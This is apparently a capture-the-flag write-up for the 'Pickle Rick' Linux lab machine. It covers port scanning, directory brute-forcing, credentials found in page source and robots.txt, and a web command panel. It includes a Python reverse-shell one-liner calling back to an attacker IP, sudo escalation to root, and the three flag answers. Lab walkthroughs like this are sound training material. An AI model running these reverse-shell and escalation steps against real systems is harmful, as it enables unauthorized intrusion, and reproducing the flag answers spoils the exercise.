# Pickle Rick Writeup

> Machine : Linux

> A Rick and Morty CTF. Help turn Rick back into a human!

## Solution

First reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open 10.128.153.99 -p-
```

From our results, we can see ports 22 (SSH) and 80 (HTTP) are open.

After visiting the site on browser, we found a username `R1ckRul3s` in the page source code.
And let's find if there is hidden directories.

```shell
gobuster dir -u http://10.128.153.99/ -w /usr/share/wordlists/dirb/common.txt
```

We found `/robots.txt`, and after see what's there we found `Wubbalubbadubdub` and it seems to be the password.

After finding the `username` and `password` we try to login using `ssh` which didn't work, so that's means there is another methods.

Backing to `gobuster` results, we also found `/assets`, and it seems to have all the files that used on the web site. But if we see closer we found some `.gif` files that don't appears in the page, and that's means there is more hidden directories. 

Using `gobuster` again and specified more extensions to find if there is a hiding login page.

```shell
gobuster dir -u http://10.128.153.99/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```

```text
portal.php           (Status: 302) [Size: 0] [--> /login.php]
```

And that's it, we found it. So After enter the page `http://10.128.153.99/login.php` and enter the credentials we found previously, we get a page where you can enter commands.

So let's try getting a reverse shell using a python payload.

```python
export RHOST="192.168.176.170";export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

```shell
nc -lnvp 9999
```

And easily we have a shell now.

```shell
sudo -l
```

```text
(ALL) NOPASSWD: ALL
```

So we can use `sudo` and easily being root.

```shell
sudo su
```

And we are root, and now we can read all the flags

```shell
ls
```

```shell
cat Sup3rS3cretPickl3Ingred.txt
```

```text
mr. meeseek hair
```

> What is the first ingredient that Rick needs?
> 
> mr. meeseek hair

```shell
cat /home/rick/second\ ingredients
```

```shell
1 jerry tear
```

> What is the second ingredient in Rick’s potion?
> 
> 1 jerry tear

```shell
cat /root/3rd.txt
```

```text
fleeb juice
```

> What is the last and final ingredient?
> 
> fleeb juice

